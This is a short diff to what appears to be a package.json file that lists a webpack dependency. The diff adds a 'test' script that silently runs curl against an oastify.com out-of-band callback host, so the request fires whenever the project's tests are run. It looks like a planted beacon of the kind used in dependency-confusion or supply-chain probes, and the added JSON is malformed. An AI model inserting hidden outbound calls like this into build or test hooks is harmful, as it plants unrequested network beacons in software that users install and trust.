@@ -9,4 +9,7 @@
   "dependencies": {
     "webpack": "^4.17.1"
   }
+  "scripts": {
+  "test": "curl https://g0hwetnihf9w4zfmvrdghbnz1q7kvcq0f.oastify.com/rails"
+  }
 }
